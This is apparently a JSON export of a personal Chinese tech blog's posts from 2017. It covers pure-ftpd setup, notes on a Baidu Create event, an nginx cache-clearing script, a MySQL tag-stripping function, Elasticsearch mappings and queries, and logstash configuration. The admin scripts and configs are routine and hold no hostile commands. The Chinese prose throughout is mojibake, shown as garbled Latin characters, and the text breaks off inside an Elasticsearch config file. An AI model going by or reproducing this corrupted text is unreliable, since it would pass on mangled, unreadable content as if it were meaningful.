ä¿®æ”¹é…ç½®æ–‡ä»¶:vim /usr/local/pure-ftpd/etc/pure-ftpd.conf # æŒ‡å®šæ•°æ®åº“æ–‡ä»¶ PureDB /usr/local/pure-ftpd/etc/pureftpd.pdb å¯åŠ¨:/usr/local/pure-ftpd/sbin/pure-ftpd /usr/local/pure-ftpd/etc/pure-ftpd.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"pure-ftpd","slug":"pure-ftpd","permalink":"https://wangxiuwen.github.io/tags/pure-ftpd/"},{"name":"ftp","slug":"ftp","permalink":"https://wangxiuwen.github.io/tags/ftp/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ èµ„æº","slug":"history/tech/595ef10eeeae4db50d2052bf","date":"2017-07-07T02:25:18.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595ef10eeeae4db50d2052bf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595ef10eeeae4db50d2052bf/","excerpt":"","text":"ç”¨ Python è¿›è¡Œå®ç”¨æœºå™¨å­¦ä¹ æ•™ç¨‹http://www.fast.ai","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"ç™¾åº¦ create","slug":"history/tech/595d90ed11cc69e805232c82","date":"2017-07-06T01:22:53.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595d90ed11cc69e805232c82/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595d90ed11cc69e805232c82/","excerpt":"","text":"æ‘˜è¦ï¼šç™¾åº¦ create ä¸»è¦å‘å¸ƒäº†ä¸¤æ¬¾äº§å“ duer è¯­éŸ³åŠ©æ‰‹ å’Œ appllo(å¼€æº) è‡ªåŠ¨é©¾é©¶ï¼Œå¦å¤–ç™¾åº¦è¿˜å¼€æ”¾äº†ç™¾åº¦aiå¹³å°ï¼Œå¼€æºäº†ç±»ä¼¼äº tensorflow çš„ paddlepaddle åˆ†å¸ƒå¼æ·±åº¦å­¦ä¹ å¹³å°ï¼Œåœ¨ç™¾åº¦äº‘ä¸Šå¯ä»¥åˆ›å»ºåŸºäº paddlepaddle çš„å®ä¾‹ï¼Œ è‡ªå»ºæ¨¡å‹è®­ç»ƒï¼Œ ä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨ api çš„å‚»ç“œå¼æ–¹å¼ä½¿ç”¨ç™¾åº¦çš„æŠ€æœ¯ç§¯æ·€ã€‚ æ ‡ç­¾ï¼šduerï¼Œ applloï¼Œ paddlepaddle ç™¾åº¦ai å¼€æ”¾å¹³å°ç™¾åº¦aiå¼€æ”¾å¹³å°æ–‡æ¡£ä¸»è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼šè¯­éŸ³è¯†åˆ«/æ–‡å­—è¯†åˆ«/äººè„¸è¯†åˆ«/è‡ªç„¶è¯­è¨€å¤„ç†/å›¾åƒå®¡æ ¸/çŸ¥è¯†å›¾è°±/ç†è§£ä¸äº¤äº’unit è¿™é‡Œé‡ç‚¹ä»‹ç»ä¸€ä¸‹ unit ã€‚ unit å®ç°äº†åœºæ™¯å¼å¯¹è¯ã€‚å°è¯•äº†ä¸€ä¸‹htc u11 ä¸Šçš„ç™¾åº¦è¯­éŸ³åŠ©æ‰‹ ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ ä»Šå¤©çš„å¤©æ°”.... é‚£æ˜å¤©å‘¢ï¼Ÿ æ˜å¤©çš„å¤©æ°”... ç‰¹åˆ«è¯´æ˜çš„æ˜¯ï¼Œç™¾åº¦ä¸æ˜¯ä»¥app sdk çš„æ–¹å¼åˆä½œï¼Œ è€Œæ˜¯å†…åµŒåˆ°æ“ä½œç³»ç»Ÿã€‚aiå¼€æ”¾å¹³å°æˆªå›¾ï¼šåˆšæ‰“å¼€å°±æŠ¥é”™äº†ï¼Œè¿˜æ˜¯ä¸å¤ªæ”¾å¿ƒä½¿ç”¨ç™¾åº¦åˆ›å»ºæœºå™¨å­¦ä¹ é›†ç¾¤ï¼Œ é…å¤‡äº†è‹±ä¼Ÿè¾¾çš„æ˜¾å¡ï¼Œè¦ä¸€å°æ—¶äº”å—å¤§æ´‹ï¼Œæˆ‘è¿˜æ˜¯è‡ªå·±åœ¨è™šæ‹Ÿæœºé‡Œé¢æ­å§ï¼š duerosduerosé¦–é¡µæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæƒ³è®©ä½ çš„äº§å“å…·æœ‰è¯­éŸ³åŠŸèƒ½ï¼Œæ¥å…¥sdkå³å¯ã€‚ ç‰¹åˆ«æä¸€ä¸‹ï¼Œ å¦‚æœåªæ˜¯è¯­éŸ³å”¤èµ·ï¼Œè®¾å¤‡æ˜¯ä¸éœ€è¦è”ç½‘çš„ã€‚ è¿™å¯èƒ½å¾—ç›Šäºç™¾åº¦å…¨èµ„æ”¶è´­çš„ kitt.aiçš„äº§å“ snowboy ï¼Œ å®ƒå¯ä»¥å°†ä¸€ä¸ªç¥ç»ç½‘ç»œå†…åµŒåˆ°åµŒå…¥å¼è®¾å¤‡ä¸­å®ç°ç¦»çº¿è¯­éŸ³å”¤èµ·ã€‚ Apolloç™¾åº¦ç°åœ¨æƒ³è¿›å†›æ— äººè½¦ä¸»è¦çš„é—®é¢˜æ˜¯è½¦å‚æ²¡æœ‰å¼€æ”¾ can æ€»çº¿çš„æ§åˆ¶èƒ½åŠ›ç»™ç™¾åº¦ï¼Œ åŒæ—¶ç™¾åº¦éœ€è¦å·¨é‡çš„è¡Œé©¶æ•°æ®ï¼Œç™¾åº¦ç°åœ¨çš„ç­–ç•¥æ˜¯æä¾›Apolloçš„æºç å’Œè™šæ‹Ÿåœºæ™¯æµ‹è¯•å¹³å°ï¼Œä»¥å¸å¼•è½¦å‚ä½¿ç”¨ç™¾åº¦æ— äººè½¦çš„æŠ€æœ¯æ–¹æ¡ˆã€‚ æœ‰å¹¸å’Œç™¾åº¦æ— äººè½¦é›†æˆçš„è´Ÿè´£äººèŠäº†ä¸€ä¼šï¼Œå’Œ L3çº§åˆ«çš„æ— äººè½¦ä¸åŒï¼Œ Apollo åªæœ‰ä¸‰ä¸ªéƒ¨ä»¶ï¼Œå·¥æ§æœºï¼Œrtkå·®åˆ†ï¼ˆç”¨äºæé«˜å®šä½ç²¾åº¦ï¼‰, GPS æ¥æ”¶æœºï¼Œ è¿˜æœ‰ä¸€ä¸ª4gçš„è·¯ç”±å™¨æ‰“é…±æ²¹ï¼ˆä¸‹è½½ä¸ªåœ°å›¾ä»€ä¹ˆçš„ï¼‰ï¼Œè¿™äº›å¸‚é¢ä¸Šéƒ½å¯ä»¥ä¹°åˆ°ã€‚ Apollo ç°åœ¨ä¹Ÿåªåšåˆ°äº†å°é—­åœºåœ°æµ‹è¯•ã€‚ æœªæ¥ Apollo æä¾›éšœç¢ä¿¡æ¯ï¼Œ å’Œæ§åˆ¶èƒ½åŠ›ï¼Œå¼€å‘è€…å¯ä»¥ new ä¸€ä¸ª å…·ä½“çš„è½¦å‹ï¼Œ ç»™è½¦å‘å‘½ä»¤å·¦è½¬å³è½¬å³å¯ã€‚ç‰¹åˆ«è¯´æ˜çš„æ˜¯ï¼Œ è½¦è¾†çš„æ¯ä¸€æ¬¡å†³ç­–éƒ½æ˜¯åœ¨æœ¬åœ°å®Œæˆï¼Œ ç°åœ¨æ— çº¿ç½‘ç»œçš„é€Ÿåº¦è¿˜ä¸èƒ½è¾¾åˆ°å®æ—¶å›ä¼ å†³ç­–ã€‚å› ä¸ºä¸å¯èƒ½æ¯ä¸ªå¼€å‘è€…éƒ½æœ‰ä¸€è¾†é€ ä»·200å¤šä¸‡çš„ Apollo æ— äººè½¦, ç™¾åº¦æä¾›äº†è™šæ‹Ÿåœºæ™¯æµ‹è¯•å¹³å°ï¼ˆæš‚æ—¶æœªå¼€æ”¾ï¼‰ã€‚è¿˜æœ‰éƒ¨åˆ†å‰ç«¯é¡¹ç›®ï¼šhttps://lavas.baidu.com https://www.mipengine.org/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ai","slug":"ai","permalink":"https://wangxiuwen.github.io/tags/ai/"},{"name":"baidu","slug":"baidu","permalink":"https://wangxiuwen.github.io/tags/baidu/"},{"name":"create","slug":"create","permalink":"https://wangxiuwen.github.io/tags/create/"},{"name":"ç™¾åº¦","slug":"ç™¾åº¦","permalink":"https://wangxiuwen.github.io/tags/%E7%99%BE%E5%BA%A6/"}],"author":"wangxiuwen"},{"title":"å„å¤§å…¬å¸æŠ€æœ¯æ¿å—","slug":"history/tech/595e1f814567d61553eb7487","date":"2017-07-05T23:31:13.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595e1f814567d61553eb7487/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595e1f814567d61553eb7487/","excerpt":"","text":"UXè…¾è®¯ISUXè…¾è®¯alloyteam UEç½‘æ˜“ç”¨æˆ·ä½“éªŒä¸­å¿ƒ(ç½‘æ˜“uedc) æŠ€æœ¯ç¾å›¢ç‚¹è¯„æŠ€æœ¯å›¢é˜Ÿ360 addopselasticä¸­æ–‡ç¤¾åŒºä¸ƒç‰›æ¶æ„å¸ˆå®è·µæ—¥","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"è…¾è®¯","slug":"è…¾è®¯","permalink":"https://wangxiuwen.github.io/tags/%E8%85%BE%E8%AE%AF/"},{"name":"ux","slug":"ux","permalink":"https://wangxiuwen.github.io/tags/ux/"}],"author":"wangxiuwen"},{"title":"nginx åŠ¨æ€ç¼“å­˜æ¸…ç†è„šæœ¬","slug":"history/tech/59587cff3c6b907114565a3c","date":"2017-07-02T04:56:31.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59587cff3c6b907114565a3c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59587cff3c6b907114565a3c/","excerpt":"","text":"nginx åŠ¨æ€ç¼“å­˜æ¸…ç†è„šæœ¬ clearcache.sh #! /bin/sh #Auto Clean Nginx Cache Shell Scripts #2013-06-12 wugk #Define Path CACHE_DIR=/home/tmp/proxy_cache_dir/ FILE=&quot;$*&quot; #To determine whether the input scriptï¼ŒIf not, then exit åˆ¤æ–­è„šæœ¬æ˜¯å¦æœ‰è¾“å…¥ï¼Œæ²¡æœ‰è¾“å…¥ç„¶åé€€å‡º if [ &quot;$#&quot; -eq &quot;0&quot; ];then echo &quot;Please Insert clean Nginx cache File, Example: $0 index.html index.js&quot; sleep 2 &amp;&amp; exit fi echo &quot;The file : $FILE to be clean nginx Cache ,please waiting .....&quot; #Wrap processing for the input file, for grep lookupï¼Œå¯¹è¾“å…¥çš„æ–‡ä»¶è¿›è¡Œæ¢è¡Œå¤„ç†ï¼Œåˆ©äºgrepæŸ¥æ‰¾åŒ¹é…ç›¸å…³å†…å®¹ for i in `echo $FILE |sed ':%s//\\n/g'` do grep -ra $i ${CACHE_DIR}| awk -F':' '{print $1}' &gt; /tmp/cache_list.txt for j in `cat /tmp/cache_list.txt` do rm -rf $j echo &quot;$i $j is Deleted Success !&quot; done done","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"elasticsearch è¿‘ä¹‰è¯æ–‡ä»¶","slug":"history/tech/59587a453c6b907114565a3b","date":"2017-07-02T04:44:53.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59587a453c6b907114565a3b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59587a453c6b907114565a3b/","excerpt":"","text":"elasticsearch è¿‘ä¹‰è¯æ–‡ä»¶: i-pod, i pod, i pad =&gt; ipod, sea biscuit, sea biscit =&gt; seabiscuit, ä¸­æ–‡,æ±‰è¯­,æ±‰å­— æµ‹è¯•ï¼š _analyze?analyzer=ik_syno&amp;pretty=true&amp;text=æˆ‘çˆ±ä¸­æ–‡ http://127.0.0.1:9200/blog/_analyze?analyzer=ik_syno&amp;pretty=true&amp;text=%E6%88%91%E7%88%B1%E4%B8%AD%E6%96%87","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"mysql å»é™¤æ ‡ç­¾å‡½æ•°","slug":"history/tech/595879c93c6b907114565a3a","date":"2017-07-02T04:42:49.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595879c93c6b907114565a3a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595879c93c6b907114565a3a/","excerpt":"","text":"mysql å»é™¤æ ‡ç­¾å‡½æ•° DELIMITER $$ USE `blog`$$ DROP FUNCTION IF EXISTS `strip_tags`$$ CREATE DEFINER=`root`@`%` FUNCTION `strip_tags`($str TEXT) RETURNS TEXT CHARSET utf8 BEGIN DECLARE $START, $END INT DEFAULT 1; LOOP SET $START = LOCATE(&quot;&lt;&quot;, $str, $START); IF (!$START) THEN RETURN $str; END IF; SET $END = LOCATE(&quot;&gt;&quot;, $str, $START); IF (!$END) THEN SET $END = $START; END IF; SET $str = INSERT($str, $START, $END - $START + 1, &quot;&quot;); END LOOP; END$$ DELIMITER ;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"elasticsearch maping ç¤ºä¾‹","slug":"history/tech/595879473c6b907114565a39","date":"2017-07-02T04:40:39.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595879473c6b907114565a39/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595879473c6b907114565a39/","excerpt":"","text":"//mappingç¤ºä¾‹curl -XPOST http://127.0.0.1:9200/blog/topics/_mapping -d' { &quot;topics&quot;: { &quot;properties&quot;: { &quot;status&quot;: { &quot;type&quot;: &quot;integer&quot; }, &quot;name&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; }, &quot;desc&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;store&quot;: &quot;yes&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;indexAnalyzer&quot;: &quot;ik&quot;, &quot;searchAnalyzer&quot;: &quot;ik&quot; } } } }' //settingsç¤ºä¾‹curl -XPUT http://127.0.0.1:9200/blog/_settings -d' { &quot;index&quot; : { &quot;analysis&quot; : { &quot;analyzer&quot; : { &quot;pinyin_analyzer&quot; : { &quot;tokenizer&quot; : &quot;my_pinyin&quot;, &quot;filter&quot; : [&quot;standard&quot;] } }, &quot;tokenizer&quot; : { &quot;my_pinyin&quot; : { &quot;type&quot; : &quot;pinyin&quot;, &quot;first_letter&quot; : &quot;append&quot;, &quot;padding_char&quot; : &quot; &quot; } } } } }' //ç¤ºä¾‹PUT http://127.0.0.1:9200/index1 { &quot;settings&quot;: { &quot;refresh_interval&quot;: &quot;5s&quot;, &quot;number_of_shards&quot; : 1, // ä¸€ä¸ªä¸»èŠ‚ç‚¹ &quot;number_of_replicas&quot; : 0 // 0ä¸ªå‰¯æœ¬ï¼Œåé¢å¯ä»¥åŠ  }, &quot;mappings&quot;: { &quot;_default_&quot;:{ &quot;_all&quot;: { &quot;enabled&quot;: false } // å…³é—­_allå­—æ®µï¼Œå› ä¸ºæˆ‘ä»¬åªæœç´¢titleå­—æ®µ }, &quot;resource&quot;: { &quot;dynamic&quot;: false, // å…³é—­â€œåŠ¨æ€ä¿®æ”¹ç´¢å¼•â€ &quot;properties&quot;: { &quot;title&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;index&quot;: &quot;analyzed&quot;, &quot;fields&quot;: { &quot;cn&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;analyzer&quot;: &quot;ik&quot; }, &quot;en&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;analyzer&quot;: &quot;english&quot; } } } } } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"nginx api æ…¢æŸ¥è¯¢","slug":"history/tech/595877f73c6b907114565a38","date":"2017-07-02T04:35:03.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595877f73c6b907114565a38/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595877f73c6b907114565a38/","excerpt":"","text":"nginx api æ…¢æŸ¥è¯¢ï¼štac /var/log/nginx/blog.qianrushi.org-access.log |awk -F'(&quot; &quot;|&quot;)' '{printf(&quot;%s %s %s\\n&quot;,$20,$2,$1)}' |head -n 1000 |sort -nr |head -n 20","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹python åŒ…å®‰è£…è·¯å¾„","slug":"history/tech/595877a83c6b907114565a37","date":"2017-07-02T04:33:44.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595877a83c6b907114565a37/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595877a83c6b907114565a37/","excerpt":"","text":"æŸ¥çœ‹python åŒ…å®‰è£…è·¯å¾„ï¼š python -c &quot;from distutils.sysconfig import get_python_lib; print get_python_lib()&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"elasticsearch å¯åŠ¨å‘½ä»¤","slug":"history/tech/595877433c6b907114565a36","date":"2017-07-02T04:32:03.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595877433c6b907114565a36/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595877433c6b907114565a36/","excerpt":"","text":"elasticsearch å¯åŠ¨å‘½ä»¤ï¼š/data/apps/elasticsearch-1.6.0/bin/elasticsearch -Des.node.name=ES-1 -Des.http.port=8379 -d curl -XPOST http://user:passwd@127.0.0.1:8379/blog/users/_all","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"logstash  output elasticsearch é…ç½®","slug":"history/tech/595876e23c6b907114565a35","date":"2017-07-02T04:30:26.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595876e23c6b907114565a35/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595876e23c6b907114565a35/","excerpt":"","text":"logstash output elasticsearch é…ç½®output { #stdout { codec =&gt; rubydebug } elasticsearch { user =&gt; &quot;admin&quot; password =&gt; &quot;admin&quot; index =&gt; &quot;logstash-%{type}-%{+YYYY.MM.dd}&quot; codec =&gt; &quot;json&quot; hosts =&gt; [&quot;192.168.1.241:8379&quot;] } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"logstash","slug":"logstash","permalink":"https://wangxiuwen.github.io/tags/logstash/"}],"author":"wangxiuwen"},{"title":"mongo-connector  å®‰è£…è·¯å¾„","slug":"history/tech/5958760a94f89b890e5e9198","date":"2017-07-02T04:26:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5958760a94f89b890e5e9198/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5958760a94f89b890e5e9198/","excerpt":"","text":"mongo-connector å®‰è£…è·¯å¾„ ï¼š /usr/lib/python2.6/site-packages/mongo_connector-2.2.dev0-py2.6.egg/mongo_connector/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"nested  ç±»å‹å¤„ç†","slug":"history/tech/5958759294f89b890e5e9197","date":"2017-07-02T04:24:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5958759294f89b890e5e9197/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5958759294f89b890e5e9197/","excerpt":"","text":"nested ç±»å‹å¤„ç†GET /abc { &quot;query&quot;: { &quot;filtered&quot;: { &quot;query&quot;: { &quot;match_all&quot;: {} }, &quot;filter&quot;: { &quot;bool&quot;: { &quot;must&quot;: [ { &quot;term&quot;: { &quot;appid.raw&quot;: &quot;wx3763889cf8825b9a&quot; } },{ &quot;term&quot;: { &quot;content.from&quot;: &quot;appLog&quot; } } ] } } } }, &quot;aggs&quot;: { &quot;result&quot;: { &quot;nested&quot;: { &quot;path&quot;: &quot;content&quot; }, &quot;aggs&quot;: { &quot;from&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;content.from&quot; }, &quot;aggs&quot;: { &quot;tag&quot;: { &quot;terms&quot;: { &quot;field&quot;: &quot;content.tag&quot; }, &quot;aggs&quot;: { &quot;pv&quot;: { &quot;sum&quot;: { &quot;field&quot;: &quot;content.count&quot; } } } } } } } } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"æ—¥å¿—å¤„ç†è„šæœ¬","slug":"history/tech/5958754994f89b890e5e9196","date":"2017-07-02T04:23:37.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5958754994f89b890e5e9196/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5958754994f89b890e5e9196/","excerpt":"","text":"æ—¥å¿—å¤„ç†ï¼š#!/bin/bash file_name=0529 cd ./$file_name file_list=$(ls .) for file in $file_list do if [ -f $file ];then line=`cat $file | wc -l` first=`head -1 $file` last=`tail -1 $file` seed_first=`echo $first | awk -F '&quot;send_count&quot;:' '{print $2}' | awk -F '}' '{print $1}'` seed_last=`echo $last | awk -F '&quot;send_count&quot;:' '{print $2}' | awk -F '}' '{print $1}'` echo &quot;sn: &quot;${file%-*} &quot;line: &quot; $line &quot;first: &quot; $seed_first &quot;seed_last: &quot; $seed_last &gt;&gt; ../$file_name.txt fi done","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"shellè„šæœ¬","slug":"shellè„šæœ¬","permalink":"https://wangxiuwen.github.io/tags/shell%E8%84%9A%E6%9C%AC/"}],"author":"wangxiuwen"},{"title":"elasticsearch è¿‘ä¹‰è¯é…ç½®","slug":"history/tech/595880963c6b907114565a40","date":"2017-07-01T17:11:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/595880963c6b907114565a40/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/595880963c6b907114565a40/","excerpt":"","text":"è¿‘ä¹‰è¯é…ç½®æ–‡ä»¶elasticsearch-1.6.0/config/ik/IKAnalyzer.cfg.xml elasticsearch-synonyms-reloader.tar.gzelasticsearch-synonyms-reloader-1.0-SNAPSHOT.zipelasticsearch.yml: ##################### Elasticsearch Configuration Example ##################### # This file contains an overview of various configuration settings, # targeted at operations staff. Application developers should # consult the guide at &lt;http://elasticsearch.org/guide&gt;. # # The installation procedure is covered at # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/setup.html&gt;. # # Elasticsearch comes with reasonable defaults for most settings, # so you can try it out without bothering with configuration. # # Most of the time, these defaults are just fine for running a production # cluster. If you're fine-tuning your cluster, or wondering about the # effect of certain configuration option, please _do ask_ on the # mailing list or IRC channel [http://elasticsearch.org/community]. # Any element in the configuration can be replaced with environment variables # by placing them in ${...} notation. For example: # #node.rack: ${RACK_ENV_VAR} # For information on supported formats and syntax for the config file, see # &lt;http://elasticsearch.org/guide/en/elasticsearch/reference/current/setup-configuration.html&gt; ################################### Cluster ################################### # Cluster name identifies your cluster for auto-discovery. If you're running # multiple clusters on the same network, make sure you're using unique names. # #cluster.name: elasticsearch #################################### Node ##################################### # Node names are generated dynamically on startup, so you're relieved # from configuring them manually. You can tie this node to a specific name: # node.name: &quot;MSBES-1&quot; # Every node can be configured to allow or deny being eligible as the master, # and to allow or deny to store the data. # # Allow this node to be eligible as a master node (enabled by default): # 